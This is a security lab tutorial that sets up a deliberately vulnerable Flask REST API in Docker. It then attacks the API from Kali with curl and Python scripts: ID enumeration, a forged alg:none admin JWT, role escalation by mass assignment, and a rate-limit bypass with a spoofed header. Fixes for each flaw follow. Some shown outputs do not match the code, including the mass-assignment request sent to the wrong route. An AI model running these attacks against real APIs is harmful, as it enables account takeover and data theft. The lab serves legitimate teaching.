# Lab 12: API Security Testing

## Objective

Attack a live REST API from Kali Linux using the OWASP API Security Top 10. You will:

1. **BOLA/IDOR** — access any user's orders and profile by changing the ID in the URL
2. **JWT alg:none** — forge an admin token with no secret needed
3. **Mass Assignment** — escalate your own role from `user` to `admin` by sending extra fields
4. **Excessive Data Exposure** — read internal cost prices and supplier secrets from a public endpoint
5. **Broken Function Level Authorization** — access an unauthenticated internal admin endpoint
6. **Rate Limit Bypass** — defeat IP-based rate limiting with a spoofed `X-Forwarded-For` header

Every attack runs from **Kali against a live Flask API** — no simulation, all real HTTP responses.

---

## Background

The **OWASP API Security Top 10** (2023) was created because APIs fail in ways the classic OWASP Top 10 doesn't fully capture. REST APIs are attacked differently from web pages — there is no browser enforcing same-origin, no HTML form to inspect, and the API's own documentation often maps the attack surface.

**Why APIs are the fastest-growing attack surface:**
- Mobile apps embed API tokens in binaries — extractable with a hex editor
- API versioning (`/api/v1/`, `/api/v2/`) means old broken endpoints stay live
- Developers return full ORM objects, leaking fields never meant to be public
- Rate limiting on IPs is trivially bypassed with `X-Forwarded-For` headers

**Real-world examples:**
- **Venmo (2019)** — `/transactions` endpoint was public; 200M transactions scraped showing who paid who for what. BOLA.
- **Peloton (2021)** — `/api/user/{userId}` returned private data including location, age, weight for any user ID. BOLA.
- **T-Mobile (2023)** — API returned all account data including SIM card details with no auth. Broken function-level authorization.
- **JWT alg:none** — Exploited in Auth0, AWS Cognito, and multiple Node.js apps using the `jsonwebtoken` library before v9.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a12                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── API responses ───────────────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │         VICTIM API SERVER          │  │
│  │  • nmap              │  │   zchencow/innozverse-cybersec     │  │
│  │  • gobuster          │  │                                    │  │
│  └──────────────────────┘  │  Flask REST API :5000              │  │
│                             │  SQLite: users, orders, products   │  │
│                             │  JWT auth (vulnerable to alg:none) │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
50 minutes

## Prerequisites
- Docker installed and running
- Lab 10 or 11 completed (familiarity with the two-container setup)

## Tools
| Tool | Container | Purpose |
|------|-----------|---------|
| `curl` | Kali | Send HTTP requests, exploit all API endpoints |
| `python3` | Kali | Craft JWT forgeries, automate BOLA enumeration |
| `nmap` | Kali | Port and service fingerprinting |
| `gobuster` | Kali | Enumerate API endpoints and routes |

---

## Lab Instructions

### Step 1: Environment Setup — Launch the Vulnerable API

The victim runs a REST API with 3 users (`admin`, `alice`, `bob`) and multiple endpoints that are vulnerable to different OWASP API Top 10 issues.

```bash
docker network create lab-a12

cat > /tmp/victim_a12.py << 'PYEOF'
from flask import Flask, request, jsonify
import sqlite3, base64, hmac, hashlib, json, time

app = Flask(__name__)
JWT_SECRET = "secret123"
DB = '/tmp/shop_a12.db'
RATE = {}

with sqlite3.connect(DB) as db:
    db.executescript("""
        CREATE TABLE IF NOT EXISTS users    (id INTEGER PRIMARY KEY, username TEXT, email TEXT, role TEXT, api_key TEXT);
        CREATE TABLE IF NOT EXISTS orders   (id INTEGER PRIMARY KEY, user_id INTEGER, product TEXT, amount REAL, notes TEXT);
        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, cost REAL, supplier_secret TEXT);
        INSERT OR IGNORE INTO users VALUES
            (1,'admin','admin@innozverse.com','admin','key_admin_secret_xyz'),
            (2,'alice','alice@corp.com','user','key_alice_abc123'),
            (3,'bob','bob@email.com','user','key_bob_def456');
        INSERT OR IGNORE INTO orders VALUES
            (1,2,'Surface Pro 12',864.00,'ship to alice home'),
            (2,3,'Surface Pen',49.99,'gift wrap'),
            (3,1,'Surface Laptop 5',1299.00,'admin test order');
        INSERT OR IGNORE INTO products VALUES
            (1,'Surface Pro 12',864.00,420.00,'SUPPLIER-SECRET-A'),
            (2,'Surface Laptop 5',1299.00,650.00,'SUPPLIER-SECRET-B'),
            (3,'Surface Pen',49.99,8.00,'SUPPLIER-SECRET-C');
    """)

def b64url(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def b64url_dec(s):
    s += '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def make_jwt(payload):
    h = b64url(json.dumps({"alg":"HS256","typ":"JWT"}))
    p = b64url(json.dumps(payload))
    sig = b64url(hmac.new(JWT_SECRET.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"

def verify_jwt(token):
    try:
        h_b64, p_b64, sig = token.split('.')
        header  = json.loads(b64url_dec(h_b64))
        payload = json.loads(b64url_dec(p_b64))
        alg = header.get('alg','').lower()
        if alg == 'none':
            return payload          # BUG: accepts unsigned tokens!
        if alg == 'hs256':
            exp = b64url(hmac.new(JWT_SECRET.encode(), f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest())
            return payload if sig == exp else None
    except: pass
    return None

@app.route('/')
def index():
    return jsonify({'app':'InnoZverse API v2','version':'2.3.1'})

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json() or {}
    u, p = data.get('username',''), data.get('password','')
    creds = {'admin':'admin','alice':'alice123','bob':'bob123'}
    if creds.get(u) == p:
        ids   = {'admin':1,'alice':2,'bob':3}
        roles = {'admin':'admin','alice':'user','bob':'user'}
        return jsonify({'token': make_jwt({'user_id':ids[u],'username':u,'role':roles[u]})})
    return jsonify({'error':'Invalid credentials'}), 401

@app.route('/api/orders/<int:order_id>')
def get_order(order_id):
    token = request.headers.get('Authorization','').replace('Bearer ','')
    payload = verify_jwt(token)
    if not payload: return jsonify({'error':'Unauthorized'}), 401
    # BUG: checks token valid but NOT that order belongs to this user
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    order = db.execute('SELECT * FROM orders WHERE id=?',(order_id,)).fetchone()
    return jsonify(dict(order)) if order else (jsonify({'error':'Not found'}), 404)

@app.route('/api/users/<int:user_id>')
def get_user(user_id):
    token = request.headers.get('Authorization','').replace('Bearer ','')
    payload = verify_jwt(token)
    if not payload: return jsonify({'error':'Unauthorized'}), 401
    # BUG: no check that user_id == payload['user_id']
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    user = db.execute('SELECT * FROM users WHERE id=?',(user_id,)).fetchone()
    return jsonify(dict(user)) if user else (jsonify({'error':'Not found'}), 404)

@app.route('/api/users/<int:user_id>/update', methods=['POST'])
def update_user(user_id):
    token = request.headers.get('Authorization','').replace('Bearer ','')
    payload = verify_jwt(token)
    if not payload: return jsonify({'error':'Unauthorized'}), 401
    data = request.get_json() or {}
    db = sqlite3.connect(DB)
    # BUG: updates any fields including 'role' — mass assignment
    for field, value in data.items():
        try: db.execute(f'UPDATE users SET {field}=? WHERE id=?',(value, user_id))
        except: pass
    db.commit()
    db.row_factory = sqlite3.Row
    updated = db.execute('SELECT * FROM users WHERE id=?',(user_id,)).fetchone()
    return jsonify(dict(updated))

@app.route('/api/products')
def products():
    # BUG: returns internal cost and supplier_secret — excessive data exposure
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    return jsonify([dict(r) for r in db.execute('SELECT * FROM products').fetchall()])

@app.route('/api/internal/users')
def internal_users():
    # BUG: no authentication required
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    return jsonify([dict(r) for r in db.execute('SELECT * FROM users').fetchall()])

@app.route('/api/search')
def search():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    now = time.time()
    RATE[ip] = [t for t in RATE.get(ip,[]) if now - t < 10]
    if len(RATE[ip]) >= 5:
        return jsonify({'error':'Rate limited — try again later'}), 429
    RATE[ip].append(now)
    q = request.args.get('q','')
    db = sqlite3.connect(DB); db.row_factory = sqlite3.Row
    rows = db.execute("SELECT id,name,price FROM products WHERE name LIKE ?", (f'%{q}%',)).fetchall()
    return jsonify([dict(r) for r in rows])

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

docker run -d \
  --name victim-a12 \
  --network lab-a12 \
  -v /tmp/victim_a12.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

sleep 4

VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a12.IPAddress}}' victim-a12)
echo "Victim IP: $VICTIM_IP"
curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse API v2",
    "version": "2.3.1"
}
```

---

### Step 2: Launch the Kali Attacker Container

```bash
docker run --rm -it \
  --name kali-attacker \
  --network lab-a12 \
  zchencow/innozverse-kali:latest bash
```

Set target and run initial recon:

```bash
export TARGET="http://victim-a12:5000"

# Fingerprint
nmap -sV -p 5000 victim-a12

# Enumerate API endpoints
gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/small.txt \
  -t 10 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/login                (Status: 405)
/products             (Status: 200)
/search               (Status: 200)
```

---

### Step 3: Get a Valid Token — Authenticate as alice

```bash
echo "=== Log in as alice and capture JWT ==="

ALICE_TOKEN=$(curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  $TARGET/api/login \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token: ${ALICE_TOKEN:0:80}..."
echo ""

# Decode the JWT payload (no secret needed — just base64)
echo "=== Decoded JWT payload ==="
echo $ALICE_TOKEN | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
def b64d(s):
    s += '=' * (-len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))
header  = b64d(parts[0])
payload = b64d(parts[1])
print('Header: ', json.dumps(header))
print('Payload:', json.dumps(payload))
print()
print('Observation: role=user, user_id=2')
print('Goal: become role=admin, access user_id=1 data')
"
```

**📸 Verified Output:**
```
Token: eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1...

Header:  {"alg": "HS256", "typ": "JWT"}
Payload: {"user_id": 2, "username": "alice", "role": "user"}

Observation: role=user, user_id=2
Goal: become role=admin, access user_id=1 data
```

> 💡 **JWT payloads are base64-encoded, not encrypted.** Anyone can decode and read them without the secret. The secret only protects the signature — if the server doesn't verify the signature, the payload is fully attacker-controlled. This is why `alg:none` attacks are so powerful.

---

### Step 4: BOLA / IDOR — Access Any User's Orders

BOLA (Broken Object Level Authorization) — the #1 OWASP API vulnerability. Alice is user_id=2, but the API lets her access orders belonging to any user_id.

```bash
echo "=== BOLA: access orders by incrementing the ID ==="

# Alice's own order (user_id=2) — legitimate
echo "[Order 1 — Alice's order]:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/orders/1 | python3 -m json.tool

echo ""

# Bob's order (user_id=3) — IDOR: alice reads bob's private notes
echo "[Order 2 — BOB's order (should be blocked)]:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/orders/2 | python3 -m json.tool

echo ""

# Admin's order (user_id=1) — alice reads admin's order
echo "[Order 3 — ADMIN's order (should be blocked)]:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/orders/3 | python3 -m json.tool

echo ""
echo "=== Enumerate ALL orders automatically ==="
python3 << 'EOF'
import urllib.request, json, os

TARGET = "http://victim-a12:5000"

# Get token
req = urllib.request.Request(f"{TARGET}/api/login",
    data=json.dumps({"username":"alice","password":"alice123"}).encode(),
    headers={"Content-Type":"application/json"})
token = json.loads(urllib.request.urlopen(req).read())['token']

print("Enumerating orders 1..5 as alice (user_id=2):")
for oid in range(1, 6):
    req2 = urllib.request.Request(f"{TARGET}/api/orders/{oid}",
        headers={"Authorization": f"Bearer {token}"})
    try:
        order = json.loads(urllib.request.urlopen(req2).read())
        owner = "MINE" if order.get('user_id') == 2 else "OTHER USER'S DATA"
        print(f"  Order {oid}: {order['product']:<25} user_id={order['user_id']}  [{owner}]")
        if order.get('notes'):
            print(f"           notes: {order['notes']}")
    except:
        print(f"  Order {oid}: not found")
EOF
```

**📸 Verified Output:**
```json
[Order 1 — Alice's order]:
{
    "amount": 864.0, "id": 1, "notes": "ship to alice home",
    "product": "Surface Pro 12", "user_id": 2
}

[Order 2 — BOB's order]:
{
    "amount": 49.99, "id": 2, "notes": "gift wrap",
    "product": "Surface Pen", "user_id": 3
}

[Order 3 — ADMIN's order]:
{
    "amount": 1299.0, "id": 3, "notes": "admin test order",
    "product": "Surface Laptop 5", "user_id": 1
}

Enumerating orders 1..5 as alice (user_id=2):
  Order 1: Surface Pro 12           user_id=2  [MINE]
           notes: ship to alice home
  Order 2: Surface Pen              user_id=3  [OTHER USER'S DATA]
           notes: gift wrap
  Order 3: Surface Laptop 5         user_id=1  [OTHER USER'S DATA]
           notes: admin test order
```

> 💡 **BOLA is #1 in the OWASP API Top 10 because it requires zero skill to exploit** — just change a number in the URL. The server validates the token (is the user logged in?) but not the object (does this order belong to this user?). Fix: `WHERE id=? AND user_id=?` using the user_id from the verified JWT payload — never from the request.

---

### Step 5: BOLA — Access Any User Profile (API Key Leak)

```bash
echo "=== BOLA on /api/users/{id} — read any user's full profile ==="

# Alice reading her own profile (legitimate)
echo "[Alice reads her own profile — user_id=2]:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/users/2 | python3 -m json.tool

echo ""

# Alice reading the ADMIN profile — exposes admin's API key
echo "[Alice reads ADMIN profile — user_id=1]:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/users/1 | python3 -m json.tool
```

**📸 Verified Output:**
```json
[Alice reads ADMIN profile — user_id=1]:
{
    "api_key": "key_admin_secret_xyz",
    "email": "admin@innozverse.com",
    "id": 1,
    "role": "admin",
    "username": "admin"
}
```

---

### Step 6: JWT alg:none Attack — Forge an Admin Token

```bash
echo "=== JWT alg:none: forge an admin token without knowing the secret ==="

python3 << 'EOF'
import base64, json, urllib.request

TARGET = "http://victim-a12:5000"

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Step 1: set alg=none in header
header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}))

# Step 2: claim to be admin with user_id=1
payload = b64url(json.dumps({"user_id": 1, "username": "admin", "role": "admin"}))

# Step 3: empty signature — no secret needed
forged_token = f"{header}.{payload}."

print(f"[*] Forged token: {forged_token[:100]}...")
print()

# Step 4: use forged token to access admin's profile
req = urllib.request.Request(
    f"{TARGET}/api/users/1",
    headers={"Authorization": f"Bearer {forged_token}"})
resp = json.loads(urllib.request.urlopen(req).read())

print("[!] Admin profile accessed with FORGED token (no password, no secret):")
for k, v in resp.items():
    print(f"    {k}: {v}")
EOF
```

**📸 Verified Output:**
```
[*] Forged token: eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1...

[!] Admin profile accessed with FORGED token (no password, no secret):
    id: 1
    username: admin
    email: admin@innozverse.com
    role: admin
    api_key: key_admin_secret_xyz
```

> 💡 **The `alg:none` attack works because the server reads `alg` from the token header — which the attacker controls.** When `alg=none`, the server skips signature verification entirely. Fix: never read the algorithm from the token. Hardcode it server-side: `if header['alg'] != 'HS256': reject`. Use a well-maintained JWT library that handles this for you (e.g., `python-jose`, `authlib`).

---

### Step 7: Mass Assignment — Escalate Role from user to admin

```bash
echo "=== Mass assignment: send 'role' field to escalate privileges ==="

echo "[Before attack — Alice is 'user']:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/users/2 | python3 -c "
import sys,json; d=json.load(sys.stdin)
print(f'  username={d[\"username\"]}  role={d[\"role\"]}  email={d[\"email\"]}')"

echo ""
echo "[Sending update with role=admin in the body]:"
curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{"role":"admin","email":"hacked@evil.com"}' \
  $TARGET/api/users/2 | python3 -m json.tool

echo ""
echo "[After attack — Alice is now 'admin']:"
curl -s -H "Authorization: Bearer $ALICE_TOKEN" \
  $TARGET/api/users/2 | python3 -c "
import sys,json; d=json.load(sys.stdin)
print(f'  username={d[\"username\"]}  role={d[\"role\"]}  email={d[\"email\"]}')"
```

**📸 Verified Output:**
```
[Before attack — Alice is 'user']:
  username=alice  role=user  email=alice@corp.com

[Sending update with role=admin in the body]:
{
    "api_key": "key_alice_abc123",
    "email": "hacked@evil.com",
    "id": 2,
    "role": "admin",
    "username": "alice"
}

[After attack — Alice is now 'admin']:
  username=alice  role=admin  email=hacked@evil.com
```

> 💡 **Mass assignment happens when the server blindly maps client-supplied JSON fields directly onto the data model.** The developer wrote a generic "update user" handler that accepts any field — including `role`, `api_key`, and `username`. Fix: use an explicit allowlist of fields that users may update: `allowed = {'email', 'password'}; safe_data = {k:v for k,v in data.items() if k in allowed}`.

---

### Step 8: Excessive Data Exposure

```bash
echo "=== Excessive data exposure: public products endpoint leaks internal fields ==="

curl -s $TARGET/api/products | python3 -c "
import sys, json
products = json.load(sys.stdin)
print('Public /api/products response includes INTERNAL fields:')
for p in products:
    print(f\"\n  {p['name']} (retail: \${p['price']})\")
    print(f\"    cost:            \${p['cost']}  (margin: \${p['price']-p['cost']:.2f})\")
    print(f\"    supplier_secret: {p['supplier_secret']}  <-- should NEVER be public\")
"
```

**📸 Verified Output:**
```
Public /api/products response includes INTERNAL fields:

  Surface Pro 12 (retail: $864.0)
    cost:            $420.0  (margin: $444.00)
    supplier_secret: SUPPLIER-SECRET-A  <-- should NEVER be public

  Surface Laptop 5 (retail: $1299.0)
    cost:            $650.0  (margin: $649.00)
    supplier_secret: SUPPLIER-SECRET-B  <-- should NEVER be public

  Surface Pen (retail: $49.99)
    cost:            $8.0  (margin: $41.99)
    supplier_secret: SUPPLIER-SECRET-C  <-- should NEVER be public
```

---

### Step 9: Broken Function Level Authorization + Rate Limit Bypass

```bash
echo "=== Broken Function Level Auth: internal endpoint — no token required ==="

# No Authorization header at all — full user dump including API keys
curl -s $TARGET/api/internal/users | python3 -m json.tool

echo ""
echo "=== Rate limit bypass via X-Forwarded-For header spoofing ==="

echo "Hitting /api/search normally (limit: 5 per 10s):"
for i in $(seq 1 6); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/search?q=Surface")
  echo "  Request $i (real IP): HTTP $code $([ "$code" = "429" ] && echo "<-- BLOCKED")"
done

echo ""
echo "Bypassing rate limit by spoofing X-Forwarded-For per request:"
for i in $(seq 1 6); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "X-Forwarded-For: 10.10.10.$i" \
    "$TARGET/api/search?q=Surface")
  echo "  Request $i (spoofed IP=10.10.10.$i): HTTP $code"
done
```

**📸 Verified Output:**
```
[
    {"api_key": "key_admin_secret_xyz", "email": "admin@innozverse.com", "id": 1, "role": "admin", "username": "admin"},
    {"api_key": "key_alice_abc123",     "email": "alice@corp.com",        "id": 2, "role": "user",  "username": "alice"},
    {"api_key": "key_bob_def456",       "email": "bob@email.com",         "id": 3, "role": "user",  "username": "bob"}
]

Hitting /api/search normally (limit: 5 per 10s):
  Request 1 (real IP):          HTTP 200
  Request 2 (real IP):          HTTP 200
  Request 3 (real IP):          HTTP 200
  Request 4 (real IP):          HTTP 200
  Request 5 (real IP):          HTTP 200
  Request 6 (real IP):          HTTP 429 <-- BLOCKED

Bypassing rate limit by spoofing X-Forwarded-For per request:
  Request 1 (spoofed IP=10.10.10.1): HTTP 200
  Request 2 (spoofed IP=10.10.10.2): HTTP 200
  Request 3 (spoofed IP=10.10.10.3): HTTP 200
  Request 4 (spoofed IP=10.10.10.4): HTTP 200
  Request 5 (spoofed IP=10.10.10.5): HTTP 200
  Request 6 (spoofed IP=10.10.10.6): HTTP 200
```

> 💡 **`X-Forwarded-For` is set by load balancers and proxies — but any client can set it too.** Rate limiting purely on this header is bypassable by anyone. Fix: rate limit on the authenticated `user_id` from the JWT payload (not the IP), and combine with IP-level limiting using the verified IP from the actual TCP connection (`request.remote_addr`), not the header.

---

### Step 10: Cleanup

```bash
exit  # Exit Kali
```

```bash
docker rm -f victim-a12
docker network rm lab-a12
```

---

## Attack Summary

| Attack | OWASP API | Endpoint | Result |
|--------|-----------|----------|--------|
| BOLA on orders | API1:2023 | `GET /api/orders/{id}` | Read all users' orders and private notes |
| BOLA on users | API1:2023 | `GET /api/users/{id}` | Read admin profile + API key |
| JWT alg:none | API2:2023 | All authenticated endpoints | Forged admin token, no secret needed |
| Mass assignment | API3:2023 | `POST /api/users/{id}/update` | Escalated role from `user` to `admin` |
| Excessive data exposure | API3:2023 | `GET /api/products` | Cost prices + supplier secrets exposed |
| Broken function auth | API5:2023 | `GET /api/internal/users` | All users + API keys, zero auth |
| Rate limit bypass | API4:2023 | `GET /api/search` | Unlimited requests via spoofed IP header |

---

## Remediation

### BOLA Fix — Always filter by authenticated user
```python
# Broken
order = db.execute('SELECT * FROM orders WHERE id=?', (order_id,)).fetchone()

# Fixed
order = db.execute(
    'SELECT * FROM orders WHERE id=? AND user_id=?',
    (order_id, payload['user_id'])   # user_id from verified JWT, not request
).fetchone()
```

### JWT Fix — Hardcode the algorithm
```python
# Broken: trusts header.alg
alg = header.get('alg', '').lower()
if alg == 'none': return payload  # catastrophic

# Fixed: always HS256, never trust client
EXPECTED_ALG = 'hs256'
if header.get('alg','').lower() != EXPECTED_ALG:
    return None  # reject anything that isn't HS256
```

### Mass Assignment Fix — Explicit allowlist
```python
# Broken
for field, value in data.items():
    db.execute(f'UPDATE users SET {field}=? WHERE id=?', (value, user_id))

# Fixed
ALLOWED_USER_FIELDS = {'email', 'display_name'}
safe = {k: v for k, v in data.items() if k in ALLOWED_USER_FIELDS}
for field, value in safe.items():
    db.execute(f'UPDATE users SET {field}=? WHERE id=?', (value, user_id))
```

### Excessive Data Exposure Fix — Explicit field selection
```python
# Broken: SELECT * returns everything
rows = db.execute('SELECT * FROM products').fetchall()

# Fixed: only return public-facing fields
rows = db.execute('SELECT id, name, price FROM products').fetchall()
```

### Rate Limit Fix — Limit by user_id, not IP
```python
# Broken: trusts X-Forwarded-For (client-controlled)
ip = request.headers.get('X-Forwarded-For', request.remote_addr)

# Fixed: use JWT user_id (attacker can't spoof this)
payload = verify_jwt(token)
rate_key = f"user:{payload['user_id']}"
# Also add IP from actual TCP connection as secondary limit
ip_key = f"ip:{request.remote_addr}"  # real TCP connection IP
```

## Further Reading
- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [PortSwigger API Testing Labs](https://portswigger.net/web-security/api-testing)
- [JWT alg:none — Critical Vulnerabilities in JWT Libraries](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [BOLA — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
